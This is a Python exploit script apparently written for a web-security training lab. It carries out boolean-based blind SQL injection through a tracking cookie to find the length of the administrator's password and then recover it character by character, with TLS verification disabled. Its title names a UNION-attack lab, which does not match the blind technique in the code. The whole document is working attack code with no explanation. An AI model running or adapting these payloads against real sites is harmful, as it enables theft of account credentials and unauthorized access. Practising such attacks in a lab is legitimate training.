# Lab: SQL injection UNION attack, retrieving multiple values in a single column

import requests
import re
import sys
import bs4
from requests.utils import requote_uri
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

target_url = "https://0a400029042d2de0c011122e0040005c.web-security-academy.net"

r = requests.Session()
proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

def sql_find_password_len(url, tracking_id, session_id):
    url = url
    print("[+] Finding Password Length")
    for password_length in range(1,100):
        print("\t[*] Trying Password Length: ", str(password_length))
        payload = tracking_id + "'+AND+(SELECT+'1'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=" + str(password_length) + ")='1"
        
        headers = {
            'Cookie': payload + "; " + session_id,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
        }

        out = r.get(url, headers = headers, proxies = proxies, verify = False)
        if out.status_code == 200:
            if "Welcome" in out.text:
                print("[+] Found Password Length", str(password_length))
                return password_length

def sql_injection(tracking_id, session_id):

    url = target_url + "/filter?category=Lifestyle"

    password_len = sql_find_password_len(url, tracking_id, session_id)
    
    # creates the list of alpha numbers to brute force
    alpha_numbers = []
    for i in range(97, 123):
        alpha_numbers.append(chr(i))
    for i in range(48,58):
        alpha_numbers.append(chr(i))

    # brute to find password
    password = []
    print("[+] Finding Password")
    for index in range(1,password_len+1):

        for character in alpha_numbers:
            payload = tracking_id + "'+AND+(SELECT+SUBSTRING(password,"+str(index)+",1)+FROM+users+WHERE+username='administrator')='" + character
            headers = {
                'Cookie': payload + "; " + session_id,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
            }
            
            out = r.get(url, headers = headers, proxies = proxies, verify = False)
            if out.status_code == 200:
                if "Welcome" in out.text:
                    print("\t[*] Found {} Character: {}".format(index, character))
                    password.append(character)
    
    print("[+] Exploited. The administrator password is: ", "".join(password))

def get_tracking_id():
    url = target_url

    out = r.get(url, proxies = proxies, verify = False)
    if out.status_code == 200:
        cookies = out.headers['Set-Cookie'].split(",")
        tracking_id = (cookies[0]).split(";")[0]
        session_id = (cookies[1]).split(";")[0]
        return tracking_id, session_id
    else:
        print("[+] Error getting tracking id and session id")
        sys.exit(0)
    
tracking_id, session_id = get_tracking_id()
sql_injection(tracking_id, session_id)